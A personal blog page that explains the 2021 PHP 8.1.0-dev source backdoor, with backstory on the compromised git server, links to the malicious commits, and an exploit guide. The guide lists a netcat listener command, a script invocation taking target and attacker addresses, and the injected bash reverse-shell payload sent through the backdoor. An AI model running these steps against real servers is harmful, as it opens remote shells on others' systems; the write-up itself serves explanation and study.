<?php 
$basedir = '../../';
include($basedir.'includes/header.php'); 
?> 

      <section>

      <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## @Author: Sean Bachiller
</span></code></pre></div></div>

<div style="width:100%;height:0;padding-bottom:56%;position:relative;"><iframe src="https://giphy.com/embed/e6befnvrQBhmYWowMn" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/season-1-episode-3-s1-e6befnvrQBhmYWowMn"></a></p>
<h1 id="ctflearn">PHP 8.1.0-dev Backdoor Exploit</h1>
<p>
There has been a recent RCE exploit for PHP version 8.1.0-dev, released on March 28th, 2021.
Attackers can execute arbitrary code by sending a User-Agentt header on a server running 
this PHP version.
</p>

<h3>Backstory</h3>
<p>
According to a maintainer <a href="https://github.com/nikic/">Nikita Popov</a>, <i>"everything points towards a compromise of the git.php.net server 
(rather than a compromise of an individual git account)."</i>
<br/><br/>
Further investigation leads to the decision of discontinuing the git.php.net server, changes will instead be
pushed directly to GitHub after this incident.

<br/><br/>
Link to announcement: <a href="https://news-web.php.net/php.internals/113838">https://news-web.php.net/php.internals/113838</a>  
</br><br/>
Two malicious commits:<br/>
<ul>
<li>
<a href="https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a">https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a</a><br/><br/>
</li>
<li>
<a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d</a>
</li>
</ul>
</p>

<br/><br/>
<h1>Exploit Guide</h1>

<p><img src="https://user-images.githubusercontent.com/59718043/128385318-ead1de2b-1ada-49da-a7e5-cd748b26fab3.jpg" /></p>
<p>
The first step would be to set up a listener. Set up a Netcat listener on your attacker:
</p>
<pre><code>nc -nvlp 4444
</pre></code>
<p>
We will be using a short Python script to establish a reverse shell. Open another terminal and 
clone this repository:
</p>
<pre><code>git clone https://github.com/prodseanb/php-8.1.0-dev-backdoor-rce.git
</pre></code>
<p>
Navigate into the cloned repository and execute the script:
</p>
<pre><code>python3 revshell_php_8.1.0-dev.py [target URL] [attacker IP] [attacker PORT]
</pre></code>
<p>This should establish a remote connection to the target.</p>

<h3>How does it work?</h3>
<p>If you check out the header of the target web server during this exploit, the <code>zerodiumsystem()</code> 
function is injected. The full function looks something like this:
</p>

<pre><code>zerodiumsystem("/bin/bash -c 'bash -i >& /dev/tcp/attacker_IP/attacker_PORT 0>&1'")      
</pre></code>
<p>Luckily, the investigation team handled the incident carefully and still continues
to review the repositories for further breaches. The original code was restored and development will
also continue outside of their own git infrastructure, avoiding any unnecessary security risk. 
</p>
<br/><br/>

<h1>Sources</h1>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Subject</th>
<th>Link</th>
</tr>
</thead>
<tbody>
<tr>
<td>Changes to Git commit workflow</td>
<td><a href="https://news-web.php.net/php.internals/113838">Nikita Popov</a></td>
</tr>
<tr>
<td>RCE Python Script</td>
<td><a href="https://github.com/prodseanb/php-8.1.0-dev-backdoor-rce">flast101</a></td>
</tr>

</tbody>
</table>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Media</th>
</tr>
</thead>
<tbody>

<tr>
<td><a href="https://www.vecteezy.com/free-vector/business">Business Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://giphy.com/gifs/season-1-episode-3-s1-e6befnvrQBhmYWowMn">Break in season 1 GIF by Dream Corp LLC via GIPHY</a></td>
</tr>
</tbody>
</table>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## @Author: Sean Bachiller
## @Date: Aug 5 2021
</span></code></pre></div></div>

<div class="page-nav">
<a href="/index.php" class="previous round">&#8249;Home</a>
<!--<a href="#" class="next round">Next&#8250;</a>-->
</div>

      </section>
<?php 
$basedir = '../../';
include($basedir.'includes/footer.php'); 
?> 
